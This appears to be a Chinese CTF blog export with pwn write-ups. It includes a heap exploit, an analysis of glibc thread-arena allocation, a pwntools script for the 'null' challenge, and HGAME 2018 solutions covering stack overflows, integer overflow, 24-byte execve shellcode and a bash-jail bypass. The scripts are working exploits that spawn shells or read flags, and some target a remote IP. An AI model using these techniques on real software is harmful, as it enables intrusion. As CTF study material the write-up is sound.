p.recvuntil('Action:') p.sendline('4') p.recvuntil('index') p.sendline(str(index)) add(0x3e0,'p4nda') #0add(555,'p4nda') #1cancel(0)show(0)p.recvuntil('count: ')leak = int(p.recvline()[:-1])libc.address = leak - 88 - 0x10 - libc.symbols['__malloc_hook']print '[+] ', hex(leak)print '[+] system :',hex(libc.symbols['system'])add(0x50,p64(0x71)+p64(0x71)+p64(libc.symbols['__malloc_hook']-0x23) )#2add(0x50,'p4nda' )#3#add(555,'p4nda') #4cancel(2)cancel(3)for i in range(32): vote(3)add(0x50,'p4nda' )#5add(0x50,'p4nda' )#6add(0x50,'p4n'+p64(libc.address + 0xf0274))#0xf02a4))#6p.recvuntil('Action:')p.sendline('0')p.recvuntil('size')p.sendline(str(0x50))p.interactive()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf0274 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1117 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' null涉及到线程堆块的分配，看了两天源代码，尽管出题人说是 a relatively easy task 。 还是记录一下线程堆块分配的姿势。 线程堆块分配名词解释分配区 个人理解分配区是分配内存必要的分配结构，分为主分配区和非主分配区，主分配区利用sbrk等函数分配，地址是连续的；非主分配区是不连续的，因此需要组织多个子堆块（sub-heap），对应到下面的数据结构，每一个分配区对应一个malloc_state，每一个子堆块对应一个_heap_info。分配区的数量是一定的，与操作系统位数和CPU核数有关 1234For 32 bit systems: Number of arena = 2 * number of cores + 1.For 64 bit systems: Number of arena = 8 * number of cores + 1. 锁 锁是一个普通的变量，需要使用特殊的函数加锁解锁，为了进程间进行同步，防止发生竞争条件。 数据结构 _heap_info 仅存在于线程堆块里的数据结构，主要是标记当前sub_heap的数据信息，在线程里可以存在多个。 主要原因是 ：一个程序（进程）中可以包含多个进程，而各个进程的地址空间是共享的，主要就造成了其地址冲突。当主线程要求使用sbrk函数来保证堆空间是连续的时，那子线程智能使用mmap来分配堆空间。这样一来，由于mmap分配的特点，导致了线程分配的堆块是以块为单位的，如果某线程需要的堆块多的话，进程空间是不足的，再次使用mmap来分配heap时，二者并不连续，所以需要这样的数据结构来标识该块的所属和一些内存信息。 该sub_heap数据结构是单链表形式保存的，其_heap_info保存了前一个sub_heap的位置。 123456789101112typedef struct _heap_info&#123; mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];&#125; heap_info; malloc_state 对于进程堆有一些了解的同学对这个数据结构会很熟悉，一个非常常见的结构体是保存在libc库bss段的main_arena，这是主线程堆是唯一的，所以为了方便，在libc中加入了一个全局变量，而这个数据结构的目的是为了组织堆空间，如fastbin、unsorted bin、top链表的组织等等。 每一个线程有唯一 的malloc_state数据结构，即thread arena。 123456789101112131415161718192021222324252627282930313233struct malloc_state&#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. */ struct malloc_state *next_free; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; 结构组织 分配区的获取 可以先从malloc的代码出发，一步一步寻找分配区的生成与线程获取。首先是__libc_malloc函数 12345678910111213141516171819202122232425262728293031void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125;libc_hidden_def (__libc_malloc) malloc函数可以大致分为四部分，首先是__malloc_hook函数的检测与执行；接下来是arena_get，也就是分配区的获取；然后是_int_malloc，这个是堆块分配的主要逻辑，也是我们比较熟悉的如fastbin、unsorted bin的组织流程，它的返回值就是拟分配的堆块；最后是对拟分配堆块的一些检测。 跟踪一下arena_get函数，这是一个宏定义函数，其中，thread_arena变量是线程的全局变量，标志着最近使用过的分配区结构 1234#define arena_get(ptr, size) do &#123; \ ptr = thread_arena; \ arena_lock (ptr, size); \ &#125; while (0) 继续跟踪arena_lock函数，这也是一个宏定义函数。首先，当线程曾经拥有过分配区，会尝试对该分配区加速并使用，否则执行arena_get2函数。 123456#define arena_lock(ptr, size) do &#123; \ if (ptr &amp;&amp; !arena_is_corrupt (ptr)) \ (void) mutex_lock (&amp;ptr-&gt;mutex); \ else \ ptr = arena_get2 ((size), NULL); \ &#125; while (0) 由于我们要寻找该分配区的初始化，所以继续跟踪arena_get2： 首先，arena_get2函数调用了get_free_list()函数，猜测应该返回一个空或者一个分配区，如果成功返回了一个分配区，就直接结束；当未找到可用的分配区，就进入下面的逻辑：首先查看narenas_limit变量，应该是对于分配区个数的限制，当未初始化时，会根据内核数量及mp_areana_max进行计算。 narenas是当前分配区的个数，当不超过分配区个数时，会调用_int_new_arena生成新的分配区，否则调用reused_arena来等待服用分配区。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748arena_get2 (size_t size, mstate avoid_arena)&#123; mstate a; static size_t narenas_limit; a = get_free_list (); if (a == NULL) &#123; /* Nothing immediately available, so generate a new arena. */ if (narenas_limit == 0) &#123; if (mp_.arena_max != 0) narenas_limit = mp_.arena_max; else if (narenas &gt; mp_.arena_test) &#123; int n = __get_nprocs (); if (n &gt;= 1) narenas_limit = NARENAS_FROM_NCORES (n); else /* We have no information about the system. Assume two cores. */ narenas_limit = NARENAS_FROM_NCORES (2); &#125; &#125; repeat:; size_t n = narenas; /* NB: the following depends on the fact that (size_t)0 - 1 is a very large number and that the underflow is OK. If arena_max is set the value of arena_test is irrelevant. If arena_test is set but narenas is not yet larger or equal to arena_test narenas_limit is 0. There is no possibility for narenas to be too big for the test to always fail since there is not enough address space to create that many arenas. */ if (__glibc_unlikely (n &lt;= narenas_limit - 1)) &#123; if (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + 1, n)) goto repeat; a = _int_new_arena (size); if (__glibc_unlikely (a == NULL)) catomic_decrement (&amp;narenas); &#125; else a = reused_arena (avoid_arena); &#125; return a;&#125; 先跟踪get_free_list函数，free_list也是一个全局变量，用于标识下一个可用的分配区，逻辑十分简单，当获取到的free_list不为空，就替换了当前线程保存的分配区，并对该分配区加锁，否则返回NULL。 123456789101112131415161718192021222324252627282930static mstateget_free_list (void)&#123; mstate replaced_arena = thread_arena; mstate result = free_list; if (result != NULL) &#123; (void) mutex_lock (&amp;free_list_lock); result = free_list; if (result != NULL) &#123; free_list = result-&gt;next_free; /* The arena will be attached to this thread. */ ++result-&gt;attached_threads; detach_arena (replaced_arena); &#125; (void) mutex_unlock (&amp;free_list_lock); if (result != NULL) &#123; LIBC_PROBE (memory_arena_reuse_free_list, 1, result); (void) mutex_lock (&amp;result-&gt;mutex); thread_arena = result; &#125; &#125; return result;&#125; 再跟踪reused_arena，可以看到，程序维护了一个全局变量next_to_use，该变量初始值是&amp;main_arena，当成功获取了一个分配区后，这个变量会指向下一个分配区，也就是说分配区的使用是平均和循环的，这也避免了一个分配区被重复使用多次。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263static mstatereused_arena (mstate avoid_arena)&#123; mstate result; /* FIXME: Access to next_to_use suffers from data races. */ static mstate next_to_use; if (next_to_use == NULL) next_to_use = &amp;main_arena; /* Iterate over all arenas (including those linked from free_list). */ result = next_to_use; do &#123; if (!arena_is_corrupt (result) &amp;&amp; !mutex_trylock (&amp;result-&gt;mutex)) goto out; /* FIXME: This is a data race, see _int_new_arena. */ result = result-&gt;next; &#125; while (result != next_to_use); /* Avoid AVOID_ARENA as we have already failed to allocate memory in that arena and it is currently locked. */ if (result == avoid_arena) result = result-&gt;next; /* Make sure that the arena we get is not corrupted. */ mstate begin = result; while (arena_is_corrupt (result) || result == avoid_arena) &#123; result = result-&gt;next; if (result == begin) break; &#125; /* We could not find any arena that was either not corrupted or not the one we wanted to avoid. */ if (result == begin || result == avoid_arena) return NULL; /* No arena available without contention. Wait for the next in line. */ LIBC_PROBE (memory_arena_reuse_wait, 3, &amp;result-&gt;mutex, result, avoid_arena); (void) mutex_lock (&amp;result-&gt;mutex);out: /* Attach the arena to the current thread. Note that we may have selected an arena which was on free_list. */ &#123; /* Update the arena thread attachment counters. */ mstate replaced_arena = thread_arena; (void) mutex_lock (&amp;free_list_lock); detach_arena (replaced_arena); ++result-&gt;attached_threads; (void) mutex_unlock (&amp;free_list_lock); &#125; LIBC_PROBE (memory_arena_reuse, 2, result, avoid_arena); thread_arena = result; next_to_use = result-&gt;next; return result;&#125; 最后，分析一下一个新分配区的生成函数_int_new_arena。首先调用了new_heap函数来申请新的内存，可以看到，当获得内存后，该内存的第一块是heap_info结构，接下来设置了malloc_state结构和top头。 至此，一个新的分配区生成完毕。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768static mstate_int_new_arena (size_t size)&#123; mstate a; heap_info *h; char *ptr; unsigned long misalign; h = new_heap (size + (sizeof (*h) + sizeof (*a) + MALLOC_ALIGNMENT), mp_.top_pad); if (!h) &#123; /* Maybe size is too large to fit in a single heap. So, just try to create a minimally-sized arena and let _int_malloc() attempt to deal with the large request via mmap_chunk(). */ h = new_heap (sizeof (*h) + sizeof (*a) + MALLOC_ALIGNMENT, mp_.top_pad); if (!h) return 0; &#125; a = h-&gt;ar_ptr = (mstate) (h + 1); malloc_init_state (a); a-&gt;attached_threads = 1; /*a-&gt;next = NULL;*/ a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size; arena_mem += h-&gt;size; /* Set up the top chunk, with proper alignment. */ ptr = (char *) (a + 1); misalign = (unsigned long) chunk2mem (ptr) &amp; MALLOC_ALIGN_MASK; if (misalign &gt; 0) ptr += MALLOC_ALIGNMENT - misalign; top (a) = (mchunkptr) ptr; set_head (top (a), (((char *) h + h-&gt;size) - ptr) | PREV_INUSE); LIBC_PROBE (memory_arena_new, 2, a, size); mstate replaced_arena = thread_arena; thread_arena = a; mutex_init (&amp;a-&gt;mutex); (void) mutex_lock (&amp;list_lock); /* Add the new arena to the global list. */ a-&gt;next = main_arena.next; /* FIXME: The barrier is an attempt to synchronize with read access in reused_arena, which does not acquire list_lock while traversing the list. */ atomic_write_barrier (); main_arena.next = a; (void) mutex_unlock (&amp;list_lock); (void) mutex_lock (&amp;free_list_lock); detach_arena (replaced_arena); (void) mutex_unlock (&amp;free_list_lock); /* Lock this arena. NB: Another thread may have been attached to this arena because the arena is now accessible from the main_arena.next list and could have been picked by reused_arena. This can only happen for the last arena created (before the arena limit is reached). At this point, some arena has to be attached to two threads. We could acquire the arena lock before list_lock to make it less likely that reused_arena picks this new arena, but this could result in a deadlock with ptmalloc_lock_all. */ (void) mutex_lock (&amp;a-&gt;mutex); return a;&#125; 最后再追踪一下new_heap这个申请内存的函数。全局变量 aligned_heap_area 是上一次调用 mmap 分配内存的结束虚拟地址，并已经按照 HEAP_MAX_SIZE 大小对齐。如果 aligned_heap_area 不为空，尝试从上次映射结束地址开始映射大小为 HEAP_MAX_SIZE 的内存块， 由于全局变量 aligned_heap_area 没有锁保护，可能存在多个线程同时 mmap()函数从 aligned_heap_area 开始映射新的虚拟内存块，操作系统会保证只会有一个线程会成功，其它在同一地址映射新虚拟内存块都会失败。 无论映射是否成功，都将全局变量 aligned_heap_area 设置为 NULL。如果映射成功，但返回的虚拟地址不是按HEAP_MAX_SIZE 大小对齐的，取消该区域的映射，映射失败。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475static heap_info *internal_functionnew_heap (size_t size, size_t top_pad)&#123; size_t pagesize = GLRO (dl_pagesize); char *p1, *p2; unsigned long ul; heap_info *h; if (size + top_pad &lt; HEAP_MIN_SIZE) size = HEAP_MIN_SIZE; else if (size + top_pad &lt;= HEAP_MAX_SIZE) size += top_pad; else if (size &gt; HEAP_MAX_SIZE) return 0; else size = HEAP_MAX_SIZE; size = ALIGN_UP (size, pagesize); /* A memory region aligned to a multiple of HEAP_MAX_SIZE is needed. No swap space needs to be reserved for the following large mapping (on Linux, this is the case for all non-writable mappings anyway). */ p2 = MAP_FAILED; if (aligned_heap_area) &#123; p2 = (char *) MMAP (aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE); aligned_heap_area = NULL; if (p2 != MAP_FAILED &amp;&amp; ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1))) &#123; __munmap (p2, HEAP_MAX_SIZE); p2 = MAP_FAILED; &#125; &#125; if (p2 == MAP_FAILED) &#123; p1 = (char *) MMAP (0, HEAP_MAX_SIZE &lt;&lt; 1, PROT_NONE, MAP_NORESERVE); if (p1 != MAP_FAILED) &#123; p2 = (char *) (((unsigned long) p1 + (HEAP_MAX_SIZE - 1)) &amp; ~(HEAP_MAX_SIZE - 1)); ul = p2 - p1; if (ul) __munmap (p1, ul); else aligned_heap_area = p2 + HEAP_MAX_SIZE; __munmap (p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul); &#125; else &#123; /* Try to take the chance that an allocation of only HEAP_MAX_SIZE is already aligned. */ p2 = (char *) MMAP (0, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE); if (p2 == MAP_FAILED) return 0; if ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1)) &#123; __munmap (p2, HEAP_MAX_SIZE); return 0; &#125; &#125; &#125; if (__mprotect (p2, size, PROT_READ | PROT_WRITE) != 0) &#123; __munmap (p2, HEAP_MAX_SIZE); return 0; &#125; h = (heap_info *) p2; h-&gt;size = size; h-&gt;mprotect_size = size; LIBC_PROBE (memory_heap_new, 2, h, h-&gt;size); return h;&#125; 分配区的补充 在malloc获取较大内存空间，导致top用尽时，根据需求会扩大top块的容量。而对于非主分配区，扩大top在一定情况下是获得连续内存的，这就显示出了sub_heap的用途。跟踪一下int_malloc函数，在malloc函数的最后，有这样的代码，当申请的内存，top头无法满足时，会对fastbin进行释放操作，当仍无法满足时，会调用sysmalloc进行补充。 123456789101112131415161718192021222324252627282930313233343536373839 ... if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-&gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if (have_fastchunks (av)) &#123; malloc_consolidate (av); /* restore original bin index */ if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); &#125; /* Otherwise, relay to handle system-dependent cases */ else &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125;... 追踪sysmalloc代码，代码过长，截取非主分配区部分。当申请的堆小于mmap直接分配阈值，并且分配区是非主分配区时，首先尝试延长原有的heap长度（连续分配）；当长度不满足需求时，会重新分配一块sub_heap，并设置heap_info值，也就是利用mmap随机在内存中申请一块内存，这块内存位于刚刚分配的低地址位置。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697static void *sysmalloc (INTERNAL_SIZE_T nb, mstate av)&#123; mchunkptr old_top; /* incoming value of av-&gt;top */ INTERNAL_SIZE_T old_size; /* its size */ char *old_end; /* its end address */ long size; /* arg to first MORECORE or mmap call */ char *brk; /* return value from MORECORE */ long correction; /* arg to 2nd MORECORE call */ char *snd_brk; /* 2nd return val */ INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */ INTERNAL_SIZE_T end_misalign; /* partial page left at end of new space */ char *aligned_brk; /* aligned offset into brk */ mchunkptr p; /* the allocated/returned chunk */ mchunkptr remainder; /* remainder from allocation */ unsigned long remainder_size; /* its size */ size_t pagesize = GLRO (dl_pagesize); bool tried_mmap = false; /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; ... &#125; if (av != &amp;main_arena) &#123; heap_info *old_heap, *heap; size_t old_heap_size; /* First try to extend the current heap. */ old_heap = heap_for_ptr (old_top); old_heap_size = old_heap-&gt;size; if ((long) (MINSIZE + nb - old_size) &gt; 0 &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == 0) &#123; av-&gt;system_mem += old_heap-&gt;size - old_heap_size; arena_mem += old_heap-&gt;size - old_heap_size; set_head (old_top, (((char *) old_heap + old_heap-&gt;size) - (char *) old_top) | PREV_INUSE); &#125; else if ((heap = new_heap (nb + (MINSIZE + sizeof (*heap)), mp_.top_pad))) &#123; /* Use a newly allocated heap. */ heap-&gt;ar_ptr = av; heap-&gt;prev = old_heap; av-&gt;system_mem += heap-&gt;size; arena_mem += heap-&gt;size; /* Set up the new top. */ top (av) = chunk_at_offset (heap, sizeof (*heap)); set_head (top (av), (heap-&gt;size - sizeof (*heap)) | PREV_INUSE); /* Setup fencepost and free the old top chunk with a multiple of MALLOC_ALIGNMENT in size. */ /* The fencepost takes at least MINSIZE bytes, because it might become the top chunk again later. Note that a footer is set up, too, although the chunk is marked in use. */ old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK; set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE); if (old_size &gt;= MINSIZE) &#123; set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE); set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ)); set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA); _int_free (av, old_top, 1); &#125; else &#123; set_head (old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE); set_foot (old_top, (old_size + 2 * SIZE_SZ)); &#125; &#125; else if (!tried_mmap) /* We can at least try to use to mmap memory. */ goto try_mmap; &#125; else /* av == main_arena */ &#123; ... &#125;&#125; 至此，线程堆的初始化、扩展、sub_heap生成全部完成。 ​ 题目分析题目逻辑很简单，主函数什么都没有，只开启了一个线程。 在线程中，实现了用户输入任意大小的堆块、个数进行填充，并且可以对最后一个堆块赋值。 漏洞利用漏洞存在于赋值函数中，是一个堆溢出函数，可以溢出和堆块大小等长的堆块。 该程序不存在地址泄露，并且system的地址也已经给出。 利用方法是利用上述线程堆块分配的知识。 首先将线程第一次分配的非主分配区填充满 再次申请时，线程只能申请一个新的sub_heap，此时的sub_heap地址位于第一次申请的sub_heap低地址位置。 再次将该sub_heap填充满，在最后一次填充时进行复制，由于存在堆溢出，则可以溢出覆盖非主分配区的malloc_state结构体（thread arena），此时的利用和覆盖了main_arena的利用方法一致。 选择fastbin attack的方法进行攻击，将fastbin劫持到bss段上去，因为bss段上有一个函数指针，会在赋值后调用，将这个函数赋值为system，并将堆块起始覆盖为’/bin/sh’即可获得shell。 hint： 一定要劫持大小为0x70的fastbin链，因为可以利用bss段起始位置的STDIO file指针。 ，与第一题的利用相同，都是0x7f。 无法劫持top值达到任意分配，原因是无法过int_malloc最后的检测，感兴趣的同学可以踩踩这个坑。 ​ 解题脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import *import timedebug = 1elf = ELF('./null')if debug: p = process('./null') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: exit(0)p.recvuntil('Enter secret password:')p.send('i\'m ready for challenge\n')time.sleep(3)for i in range(0,3): p.recvuntil('Action:') p.sendline('1') p.recvuntil('Size:') p.sendline(str(0x4000)) p.recvuntil('blocks:') p.sendline(str(1000-1)) p.recvuntil('(0/1):') p.sendline('0') p.recvuntil('Action:') p.sendline('1') p.recvuntil('Size:') p.sendline(str(0x4000)) p.recvuntil('blocks:') p.sendline(str(1000-1)) p.recvuntil('(0/1):') p.sendline('0') p.recvuntil('Action:') p.sendline('1') p.recvuntil('Size:') p.sendline(str(0x4000)) p.recvuntil('blocks:') p.sendline(str(1000)) p.recvuntil('(0/1):') p.sendline('0') p.recvuntil('Action:') p.sendline('1') p.recvuntil('Size:') p.sendline(str(0x4000)) p.recvuntil('blocks:') p.sendline(str(1000-1)) p.recvuntil('(0/1):') p.sendline('0') p.recvuntil('Action:') p.sendline('1') p.recvuntil('Size:') p.sendline(str(0x4000)) p.recvuntil('blocks:') p.sendline(str(90-1)) p.recvuntil('(0/1):') p.sendline('0')p.recvuntil('Action:')p.sendline('1')p.recvuntil('Size:')p.sendline(str(0x4000))p.recvuntil('blocks:')p.sendline(str(1))p.recvuntil('(0/1):')p.sendline('1')p.recvuntil('Input:')p.send('/bin/sh\0'+p64(0)*(2+4+2+8+3-1))padding = p64(0)*(0x4000/8-2-4-8-3) +p64(0)+ p64(0x11) + p64(0)*4 +p64(0) + p64(0)*5+p64(0x60201d)+ p64(0)*4 #p64(0x602028-4)print hex(len(padding))p.send(padding)#gdb.attach(p,'info threads')p.recvuntil('Action:')p.sendline('1')p.recvuntil('Size:')p.sendline(str(0x60))p.recvuntil('blocks:')p.sendline(str(0))p.recvuntil('(0/1):')p.sendline('1')p.recvuntil('Input:')p.send('sh\0'+p64(0)+p64(0x400978)+p64(0)*(0x60/8))p.interactive() ​ 其他 打完这次比赛，感觉和大佬们的差距无限大，还是要好好读书的。 想到一个新的出题思路，既然程序的分配区是复用的，那么当一个程序的线程足够多的时候，主线程和某个线程所使用的分配区是一样的，在其他线程出现堆溢出的问题，同样可以影响主线程，比如如下的实验 123456789101112131415161718192021222324252627282930313233#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;pthread.h&gt;static int num;void *thread_func()&#123; char *a ; a = malloc(0x80); printf("[%d] malloc address %p\n",num++,a); sleep(10);&#125;int main()&#123; pthread_t tid[40]; int i; void * ret; char *a; num = 0; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); printf("this is a test for thread arena! %d\n",num); for(i = 0; i&lt;33;i++)&#123; pthread_create(&amp;tid[i],NULL,thread_func,NULL); &#125; a = malloc(0x80); printf("[*] main malloc address %p\n",a); for(i = 0; i&lt;33;i++)&#123; //pthread_create(&amp;tid[i],NULL,thread_func,NULL); pthread_join(tid[i],0); &#125; sleep(10);&#125;]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HGAME 2018 PWN题记录]]></title>
    <url>%2F2018%2F03%2F06%2Fhgame%2F</url>
    <content type="text"><![CDATA[HGAME 2018是由杭电的Vidar-Team举办的校内赛，历时一个月，记录一下其中的PWN题目。 LEVEL - WEEK 1guess_number题目流程很简单，首先使用/dev/urandom文件生成随机数，使用这个随机数作为rand()的种子，生成随机数，与用户输入的随机数进行比较，比较正确就会返回system(‘cat flag’)。 这题存在一个明显的栈溢出漏洞，但是开启了canary保护。起初思路被urandom函数带偏了，以为是要用伪随机本地爆破rand()种子，再进行生成，还暗搓搓的感叹好难啊。。后来发现在guess_num函数中的栈溢出是可以利用的，这个随机数是以参数的方式传入的，在比较时寻址方式是用ebp+4来寻址的，也就是说利用栈溢出覆盖，完全可以将随机数覆盖成任意值。 解题的exp脚本如下 1234567891011121314151617181920#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./guess_number') context.log_level = 'debug'else: p = remote('111.230.149.72 ', 10002)p.recvuntil('enter your guess:')a = "0\x00"a = a.ljust(0x128,'\x00')print len(a)p.sendline(a)print p.recv()p.interactive() flag_server题目的内容是一个登陆系统，当用户输入”admin”和随机数密码时可以将一个v9变量赋值为1，进一步可以执行system(‘cat flag’) 其中，存在一个明显的整数负数溢出漏洞，当输入的长度是负数的时候，可以输入任意长的内容，在read_n函数中溢出，则可以覆盖到调用read_n函数的main函数栈中，进一步可以覆盖v9变量为任意值，导致控制逻辑流程。 解题的exp脚本如下： 1234567891011121314151617181920from pwn import *import timedebug=0if debug: p= process('./flag_server') context.log_level = 'debug'else: p = remote('111.230.149.72 ', 10001)p.recvuntil('your username length: ')p.sendline('-1')p.recvuntil('whats your username?')a = "admin"a = a.ljust(0x50,'1')print len(a)p.sendline(a)print p.recv()p.interactive() zazahui一道贪玩蓝月梗的题目，在初始化函数中，分别将广告词和flag读到bss段中，在sub_8048698()函数中，一直让用户输入广告词。 漏洞被故意留在sub_8048698函数中，根据栈中变量位置和输入长度可以很明显的发现可以覆盖s这个变量，当把变量覆盖为flag地址时，在puts(s)中就可以读出flag。 使用的exp脚本如下： 1234567891011121314151617#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./zazahui') context.log_level = 'debug' gdb.attach(p,'b *0x80486D5')else: p = remote('111.230.149.72 ', 10003)p.recvuntil('&gt;')a= 'a'*0xb0+p32(0x804A060)+p32(0x99)p.sendline(a)p.recv()p.interactive() LEVEL - WEEK 2ez_shellcode代码逻辑从题目名字中就可猜测出来，用户输入一串shellcode，程序来执行，仅仅限制了shellcode长度不超过24个字节。 这样一来，pwntools的shellcraft.sh()就不能用了，只能手写一个shellcode拿到shell。其原理是执行int 80h，使得ebp指向’/bin/sh’,eax的值是0xb,ecx、edx置零就可以了。 解题使用的exp脚本如下： 12345678910111213141516171819202122232425262728293031#coding:utf-8from pwn import *import timedebug=0if debug: p= process('./ez_shellcode') context.log_level = 'debug' gdb.attach(p,'b *0x8048663')else: p = remote('111.230.149.72 ', 10004)p.recvuntil('&gt;')shellcode = '''push 0x68push 0x732f2f2fpush 0x6e69622fmov ebx,espxor ecx,ecxxor edx,edxpush 0xbpop eaxint 0x80'''a = shellcraft.sh()print len(asm(shellcode))p.sendline(asm(shellcode))p.interactive() ez_bash_jail此题给用户一个system(lineptr)的权利，但是限制了用户输入’abcfhgilnst‘这些字母。这样一来如’cat flag’、’cat fl\‘、’sh’、’/bin/sh’就都不能用了。 题目给了hint，是研究一下system源码：https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system 123456789101112131415161718192021222324252627282930313233343536373839... ...116 #ifdef FORK117 pid = FORK ();118 #else119 pid = __fork ();120 #endif121 if (pid == (pid_t) 0)122 &#123;123 /* Child side. */124 const char *new_argv[4];125 new_argv[0] = SHELL_NAME;126 new_argv[1] = "-c";127 new_argv[2] = line;128 new_argv[3] = NULL;129 130 /* Restore the signals. */131 (void) __sigaction (SIGINT, &amp;intr, (struct sigaction *) NULL);132 (void) __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) NULL);133 (void) __sigprocmask (SIG_SETMASK, &amp;omask, (sigset_t *) NULL);134 INIT_LOCK ();135 136 /* Exec the shell. */137 (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);138 _exit (127);139 &#125;140 else if (pid &lt; (pid_t) 0)141 /* The fork failed. */142 status = -1;143 else144 /* Parent side. */145 &#123;146 /* Note the system() is a cancellation point. But since we call147 waitpid() which itself is a cancellation point we do not148 have to do anything here. */149 if (TEMP_FAILURE_RETRY (__waitpid (pid, &amp;status, 0)) != pid)150 status = -1;151 &#125;... 可以看到system的最后是执行了execve(“/bin/sh”,new_argv,__environ)，其中new_argv[0]=’sh’,new_argv[1]=’-c’,new_argv[2]=lineptr 的。 再看一下execve的用法是什么： 1execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。 就是可以重新执行一份新的代码。 再看下一个hint，学习一下shell的变量,正则等等? 题目中过滤了许多正常字符，但是\$符号没有被过滤，$是bash脚本中一个特殊的符号，可以定义变量，在搜索中发现bash中有几个特殊的变量 1234567$0就是该bash文件名$?是上一指令的返回值$*所有位置参数的内容：就是调用调用本bash shell的参数。$@基本上与上面相同。只不过是“$*”返回的是一个字符串，字符串中存在多外空格。“$@”返回多个字符串。&quot;$1&quot;，它代表一条记录中的第一列数据 其中最特殊的是$0，它是执行execve程序时的filename路径。可以通过如下代码测试出来 123456789101112131415161718192021222324a#! /bin/shecho &quot;=============&quot;echo $0echo &quot;=============&quot;main.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main(int argc, char *argv[])&#123; char *newargv[] = &#123; &quot;xx&quot; &#125;; char *newenviron[] = &#123; NULL &#125;; newargv[0] = argv[1]; execve(&quot;./a&quot;, newargv, newenviron); 